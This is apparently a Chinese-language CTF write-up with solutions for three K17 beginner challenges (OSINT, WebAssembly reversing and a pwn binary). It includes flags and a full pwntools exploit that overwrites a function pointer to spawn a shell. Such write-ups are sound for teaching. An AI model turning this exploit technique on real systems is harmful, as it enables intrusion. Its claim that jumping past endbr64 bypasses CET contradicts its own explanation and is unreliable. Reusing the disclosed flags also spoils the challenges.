# beginner
## radioactive
根據圖片前往網站查詢站點編號為 2154006 的塔台
https://www.rfnsa.com.au/2154006/detail
![image](https://hackmd.io/_uploads/ryMbBcoigl.png)
**Flag: K17{-33.717,160.987}**


## daily re

* 題目是一個 WebAssembly (`words.wasm`) + JavaScript 的 Wordle 類型遊戲。
* 介面會根據當天的 `DAY_NUMBER` 與 `DAY_KEY` 來呼叫 `get_word`，取得答案單字。
* 題目要求：找出第 72、73、74 天的答案，格式 `K17{word1, word2, word3}`。
* 題目提示：Day 17 的答案是 `zonal`。


### 初步分析

1. 在 `index.html` 中可以看到：

   ```js
   Module.ccall('get_word', 'string', ['number','string'], [DAY_NUMBER-1, DAY_KEY])
   ```

   這說明了 `get_word` 的呼叫方式。
2. 直接呼叫 `get_word` 拿 72/73/74 會得到空字串，說明有額外驗證機制。
3. 反編譯 `words.wasm` 發現 `get_word` 會用索引與 key 計算一個位置，並驗證 key 與某個表格中的值。這代表遊戲答案存在於 data section。

### 關鍵觀察

在 `words.wasm` 的 data 區段中，出現了清晰的結構：

```
(index) (hashkey) (word)
```

例如：

```
\11 70e7726a9b8d5e65a6dbb19cf784ad5a zonal
\12 b3f61e6d07992d25a42114c7d50f5f69 loyal
\13 67cb213109a49a3b9d3ca167c051dad9 zesty
...
```

這裡可以直接看到：

* Day 17 (`0x11`，十進位 17) 的單字就是 `zonal`。
* 後面每一行依序對應 Day 18, 19, …。

直接數下去：

* `0x11` (17) = zonal
* 所以 Day N 的字就在 tag `0xNN` 後面。

找到：

* `0x48` (72) → `limbo`
* `0x49` (73) → `urban`
* `0x4a` (74) → `fiber`

### 總結

這題的陷阱在於：表面上 `get_word` 會檢查 key，不讓我們直接呼叫；但實際上遊戲答案明文存放在 `wasm` data 段，只要翻看或 dump 出來，就能順利找到所有日子的單字。
**Flag: K17{limbo, urban, fiber}**

## ezwins
#### 1. 初步分析

首先，我們對提供的二進位檔案 chal 進行基本檢查。

```bash
$ checksec chal
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
```

從 `checksec` 的結果可以看到，這是一個 64 位元的 ELF 檔案，主要的保護機制都已開啟，包括 NX、Stack Canary，甚至還有較新的 `SHSTK` (Shadow Stack) 和 `IBT` (Indirect Branch Tracking)。不過，PIE (Position-Independent Executable) 沒有開啟，這意味著程式和函式的位址在每次執行時都是固定的，大大降低了利用難度。

接著，使用 IDA Pro 或 Ghidra 進行反組譯，我們可以看到 `main` 函式的 C 偽代碼如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  // ... (stack setup) ...
  char s[8];    // [rsp+10h] [rbp-50h] - Name buffer
  char v8;      // [rsp+30h] [rbp-30h] - Age variable
  __int64 (__fastcall *v9)(...); // [rsp+31h] [rbp-2Fh] - Function pointer

  v9 = print_greeting; // v9 指向 print_greeting 函式
  puts("What's your name?");
  fgets(s, 32, stdin); // 讀取名字
  puts("How old are you?");
  __isoc99_scanf(" %lld", &v8); // 讀取年齡
  // ...
  ((void (__fastcall *)(...))v9)(...); // 呼叫 v9 指向的函式
  return 0;
}
```

程式的邏輯很簡單：
1.  初始化函式指標 `v9`，使其指向 `print_greeting` 函式。
2.  讀取使用者的名字到緩衝區 `s`。
3.  讀取使用者的年齡到變數 `v8`。
4.  呼叫 `v9` 指向的函式。

同時，我們在程式中發現一個名為 `win` 的函式，它會執行 `system("/bin/sh")`，給我們一個 shell。我們的目標就是想辦法讓程式執行 `win` 函式。

#### 2. 漏洞發掘

從偽代碼和堆疊佈局中，我們可以發現一個典型的堆疊溢位漏洞：

*   `v8` 位於 `[rbp-30h]`。
*   函式指標 `v9` 位於 `[rbp-2Fh]`。

`v8` 和 `v9` 在堆疊上是緊密相鄰的。`__isoc99_scanf(" %lld", &v8)` 會讀取一個 64 位元（8 bytes）的長整型到 `v8` 的位址。這意味著，當我們輸入年齡時，這 8 個位元組會從 `[rbp-30h]` 開始寫入，一直覆蓋到 `[rbp-29h]`。這個範圍剛好完全覆蓋了 `v9` 的低 7 個位元組。

這就是我們的攻擊向量：**透過輸入一個精心構造的 "age"，我們可以覆寫函式指標 `v9`，使其指向 `win` 函式。**

#### 3. 繞過 CET (Control-Flow Enforcement Technology)

在嘗試直接跳轉到 `win` 函式時，我們發現 `win` 函式的第一條指令是 `endbr64`。

```assembly
0x4011f6 <win+0>: endbr64
0x4011fa <win+4>: push   rbp
...
```

這是 Intel CET 安全機制的一部分。如果程式透過間接跳轉（例如呼叫函式指標）跳到一個不是 `endbr64` 的位址，CPU 會觸發一個異常，導致程式崩潰。

幸運的是，我們只需要跳過這條指令，直接跳到函式真正開始執行的地方，也就是 `0x4011fa` (`win+4`)，就可以繞過這個保護。

#### 4. 攻擊流程

我們的最終攻擊策略如下：

1.  **處理 Name 輸入**：為了避免 `fgets` 對堆疊造成任何干擾，我們只輸入一個換行符 (`\n`)。`fgets` 會讀取它，然後在緩衝區開頭寫入一個空位元組 `\x00`，這樣就不會影響到後面的 `v8` 和 `v9`。

2.  **構造 Age Payload**：
    *   我們的目標位址是 `win+4`，即 `0x4011fa`。
    *   `v9` 的原始值是 `print_greeting` 的位址 `0x401210`。
    *   `scanf` 會從 `[rbp-30h]` 開始寫入 8 個位元組。
    *   我們需要構造一個 8-byte 的 payload，當它被當作整數寫入時，能將 `v9` 的值變為 `0x4011fa`。
    *   Payload 的第一個 byte 會覆蓋 `[rbp-30h]`，我們可以隨意填充（例如用 `\x00`）。
    *   Payload 的後 7 個 byte 會覆蓋 `v9` 的低 7 個 byte。我們將 `0x4011fa` 的低 7 個 byte 填入即可。

    因此，我們的 payload 構造如下：
    `payload_bytes = b'\x00' + p64(win_addr + 4)[:7]`

3.  **取得 Flag**：
    *   將這個 payload 轉換為整數，作為 "age" 發送。
    *   程式會呼叫被我們覆寫後的 `v9`，也就是 `win+4`，成功執行 `system("/bin/sh")`。
    *   進入互動式 shell 後，執行 `ls -la /` 找到 flag 檔案（通常是 `/flag`），再用 `cat /flag` 讀取內容。


```python
#exploit.py

#!/usr/bin/env python3
from pwn import *
import ctypes
import time

BIN_PATH = './chal'
HOST = 'challenge.secso.cc'
PORT = 8001

context.binary = ELF(BIN_PATH)
elf = context.binary
context.log_level = 'info'

win_addr = None
if 'win' in elf.symbols:
    # 跳過 endbr64 指令
    win_addr_offset = elf.symbols['win'] + 4
    log.info(f'found symbol win at 0x{elf.symbols["win"]:x}')
    log.info(f'Using win address with offset: 0x{win_addr_offset:x}')
    win_addr = win_addr_offset
else:
    log.error('找不到 win 符號')
    exit(1)

def solve(io):
    # 1. 發送一個換行符，避免 fgets 影響後續的堆疊
    name_payload = b'\n'
    io.sendafter(b"What's your name?", name_payload)
    log.info(f"Sent name: {name_payload!r}")

    # 2. 構造 age payload
    # v9 的原始值是 0x401210
    # 我們的目標是 0x4011fa
    # scanf 從 &v8 ([rbp-30h]) 開始寫入 8 bytes
    # v9 在 [rbp-2Fh]，所以 scanf 的第 2-8 bytes 會覆蓋 v9 的低 7 bytes
    # 我們需要構造一個 payload，其效果等同於將 v9 的低位覆寫
    
    # 構造 payload: [任意1 byte] + [目標地址的低 7 bytes]
    payload_bytes = b'\x00' + p64(win_addr)[:7]
    age_as_int = u64(payload_bytes)

    io.sendlineafter(b'How old are you?', str(age_as_int).encode())
    log.info(f"Sent age payload bytes: {payload_bytes!r}")
    log.info(f"Sent age as int: {age_as_int}")

    # 接收 flag
    io.interactive()

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```
**Flag: K17{d1dn7_kn0w_u_c0u1d_b3_4ddr355_0f_w1n_m4ny_y34r5_0ld}**